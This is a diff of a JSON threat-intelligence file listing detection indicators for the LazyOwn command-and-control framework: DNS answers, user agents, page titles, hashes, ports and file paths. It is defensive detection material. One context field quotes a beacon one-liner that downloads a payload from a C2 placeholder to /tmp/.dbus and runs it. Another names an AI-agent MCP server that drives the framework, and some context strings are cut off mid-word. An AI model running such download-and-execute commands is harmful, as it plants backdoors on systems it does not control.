@@ -90,274 +90,364 @@
   ],
   "indicators": [
     {
-      "type": "domain",
       "value": "c2.lazyown.org",
       "confidence": "high",
       "context": "Zone the LazyOwn C2's built-in DNS server (dnslib on UDP 53 of lhost, on unless enable_c2_dns is false) answers: base64url command labels in front of c2.lazyown.org, TXT answers such as \"Servidor C2 activo\" and \"Ejecutado: <command>\" (lazyc2.py:1778-1830). Clients query the C2 address directly, so the lookup may never ",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2.py#L1793",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "domain"
     },
     {
-      "type": "string",
       "value": "Servidor C2 activo",
       "confidence": "high",
       "context": "TXT answer of the LazyOwn C2's DNS server for c2.lazyown.org; other answers are Comando no reconocido, Command not allowed and Ejecutado: <command>",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2.py#L1793",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "user_agent",
       "value": "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
       "confidence": "high",
       "context": "user_agent_3 of the payload.json LazyOwn ships, a decoy-traffic user agent slot for its beacons (core/payload_schema.py:716)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L55",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "user_agent"
     },
     {
-      "type": "user_agent",
       "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Firefox/120.0",
       "confidence": "medium",
       "context": "One of four user agents in the runtime configuration the LazyOwn C2 builds for its BlackSandBeacon Linux client (served on /stage/config). Chrome and Firefox tokens together: no real browser sends it",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/modules/bof_delivery.py#L326",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "user_agent"
     },
     {
-      "type": "string",
       "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
       "confidence": "low",
       "context": "user_agent_win of the payload.json LazyOwn ships, shown in the C2's agent builder form. A Chrome 58 string cut to Safari/537.3 that many scrapers copy: context only, or with the Gmail-style route or port 4444",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L51",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "string",
       "value": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
       "confidence": "low",
       "context": "user_agent_lin of the payload.json LazyOwn ships. Widely copied: context only",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L52",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "uri_string",
       "value": "/gmail/v1/users/",
       "confidence": "medium",
       "context": "Default c2_malleable_route of the payload.json LazyOwn ships: beacons GET <route><client id> for commands and POST results there; report/, stage/beacon, stage/config, bof/<object> and download/<path> hang off it too (lazyc2.py:3226-3673). Real Gmail API calls go to Google hosts. /api/v1/ when the key is empty (lazyc2.p",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L50",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "uri_string"
     },
     {
-      "type": "string",
       "value": "BOF_NOT_FOUND",
       "confidence": "high",
       "context": "Plain-text answer (BOF_NOT_FOUND + CRLF) of the LazyOwn C2's unauthenticated /bof/<name> route when the object is missing",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2.py#L3557",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "string",
       "value": "STAGE_FORBIDDEN",
       "confidence": "high",
       "context": "Plain-text 403 answer (STAGE_FORBIDDEN + CRLF) of the LazyOwn C2's unauthenticated /stage/beacon and /stage/config routes without a valid bearer token; STAGE_UNAVAILABLE + CRLF when nothing is staged",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2.py#L3484",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "string",
       "value": "Invalid credentials. Please provide valid username and password.",
       "confidence": "medium",
       "context": "Body of the LazyOwn C2's 401 answer on / and every operator route, sent with WWW-Authenticate: Basic realm=\"Login Required\" (a realm many Flask apps use)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2/security/auth.py#L92",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "string",
       "value": "LazyOwn Command and Control Center",
       "confidence": "high",
       "context": "Page title of the LazyOwn C2 dashboard and of its /login page when decoy mode is off",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/templates/header.html#L6",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "string",
       "value": "Live View Page -  564 plot listing Template",
       "confidence": "medium",
       "context": "Title (two spaces after the dash) of the decoy page the LazyOwn C2 serves on /login and on every 404 to addresses outside its operator allowlist (c2_decoy_mode page, the default). The page frames a templatemo.com template and posts camera frames and microphone recordings to <page URL>capture and <page URL>audio. The ti",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/templates/decoy.html#L5",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "favicon_mmh3",
       "value": "538162949",
       "confidence": "medium",
       "context": "Icon of the LazyOwn C2 (/favicon.ico, served without authentication; Shodan http.favicon.hash), computed from static/favicon.ico. Not checked for reuse by other projects",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/static/favicon.ico",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "favicon_mmh3"
     },
     {
-      "type": "md5",
       "value": "9a9fd80f9822e6db9b5b9ed4b62e3568",
       "confidence": "medium",
       "context": "LazyOwn C2 icon static/favicon.ico (125,588 bytes; the same file is docs/favicon.ico)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/static/favicon.ico",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "md5"
     },
     {
-      "type": "sha256",
       "value": "764c378abaa7d801f88d02f57199f6048042fd23d8b231bbdd0132e9064c2cc7",
       "confidence": "medium",
       "context": "LazyOwn C2 icon static/favicon.ico (125,588 bytes; the same file is docs/favicon.ico)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/static/favicon.ico",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "sha256"
     },
     {
-      "type": "port",
       "value": "4444",
       "confidence": "low",
       "context": "Default c2_port of the LazyOwn C2 web UI, operator API and HTTP beacon listener (payload.json, docker-compose.yml). Common port, use only with the page fingerprint",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L21",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "port"
     },
     {
-      "type": "port",
       "value": "9871",
       "confidence": "low",
       "context": "Default port of the LazyOwn MCP server in SSE mode (skills/lazyown_mcp.py --sse), bound to 127.0.0.1",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/skills/lazyown_mcp.py#L1045",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "port"
     },
     {
-      "type": "user_agent",
       "value": "LazyOwn/1.0",
       "confidence": "high",
       "context": "User agent of LazyOwn's exploit search, curl -H \"User-Agent: LazyOwn/1.0\" https://www.exploitalert.com/api/search-exploit?name=<keyword>. From the operator host; visible only with TLS inspection",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/utils.py#L1152",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "user_agent"
     },
     {
-      "type": "user_agent",
       "value": "lazyown-depconfuse/1.0",
       "confidence": "high",
       "context": "User agent of LazyOwn's dependency confusion check, which asks PyPI whether internal package names are registered. From the operator host; visible only with TLS inspection",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/cli/commands/supply_chain.py#L440",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "user_agent"
     },
     {
-      "type": "file_name",
       "value": "lazyc2.py",
       "confidence": "high",
       "context": "LazyOwn C2 server script, started as python3 -W ignore lazyc2.py <port> <user> <password>, so the operator password is on the command line",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/fast_run_as_r00t.sh#L255",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_name"
     },
     {
-      "type": "file_name",
       "value": "lazyown_mcp.py",
       "confidence": "high",
       "context": "LazyOwn MCP server (skills/lazyown_mcp.py, server name lazyown, tools named lazyown_*), started by Claude Code, Hermes or OpenCode from .mcp.json",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/skills/lazyown_mcp.py#L442",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_name"
     },
     {
-      "type": "string",
       "value": "lazyown_sessions",
       "confidence": "high",
       "context": "tmux session name fast_run_as_r00t.sh creates for the C2, the CLI, the auto-loop and the other services",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/fast_run_as_r00t.sh#L18",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "file_path",
       "value": "sessions/c2_launch.env",
       "confidence": "high",
       "context": "Launcher file fast_run_as_r00t.sh writes with LAZY_C2_PORT, LAZY_C2_USER and LAZY_C2_PASS before running sessions/c2_launch.sh",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/fast_run_as_r00t.sh#L245",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_path"
     },
     {
-      "type": "file_path",
       "value": "sessions/key.aes",
       "confidence": "medium",
       "context": "AES key the LazyOwn C2 uses for every beacon command and report (AES-CFB, base64(IV || ciphertext))",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2.py#L2858",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_path"
     },
     {
-      "type": "file_name",
       "value": ".c2_credentials.txt",
       "confidence": "medium",
       "context": "File (mode 600) in the LazyOwn checkout where the C2 saves the operator user and password of the run",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2/security/cli_credentials.py#L18",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_name"
     },
     {
-      "type": "file_path",
       "value": "/tmp/.dbus",
       "confidence": "medium",
       "context": "Where the Linux beacon one-liner printed by LazyOwn's c2_quickstart puts the beacon on a target: curl -sk '<c2><route>lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus. The Windows line saves to $env:TEMP\\svchost.exe",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/cli/commands/command_and_control.py#L219",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_path"
     },
     {
-      "type": "file_path",
       "value": "/home/.lazyown",
       "confidence": "medium",
       "context": "backdoor_linux_home of the payload.json LazyOwn ships, the home folder of the backdoor account its persistence commands create on a Linux target (backdoor_win_home C:/Users/lazyown/Documents on Windows)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/payload.example.json#L32",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "file_path"
     },
     {
-      "type": "docker_image",
       "value": "ghcr.io/grisuno/lazyown",
       "confidence": "medium",
       "context": "Image name in LazyOwn's docker-compose.yml (container lazyown, port 4444 published on all interfaces, NET_ADMIN). Whether the image is published was not checked",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/docker-compose.yml#L5",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "docker_image"
     },
     {
-      "type": "string",
       "value": "LAZY_CSRF_TOKEN",
       "confidence": "medium",
       "context": "Cookie the LazyOwn C2 sets for logged-in operators (JavaScript-readable CSRF token)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/lazyc2/security/csrf_flow.py#L38",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "string"
     },
     {
-      "type": "url",
       "value": "https://raw.githubusercontent.com/grisuno/LazyOwn/main/bootstrap.sh",
       "confidence": "medium",
       "context": "LazyOwn one-command install (curl -fsSL ... -o /tmp/bootstrap.sh && bash /tmp/bootstrap.sh)",
+      "actor": "LazyOwn operators",
       "source": "ThreatDefence review of the LazyOwn source code",
       "sourceUrl": "https://github.com/grisuno/LazyOwn/blob/f4e54de958740c421071ac20c98eff1bd6ab7957/README.md#L17",
-      "reported": "2026-11-25"
+      "reported": "2026-11-25",
+      "framework": "lazyown",
+      "frameworks": ["lazyown"],
+      "type": "url"
     }
   ],
   "indicatorsTruncated": false,
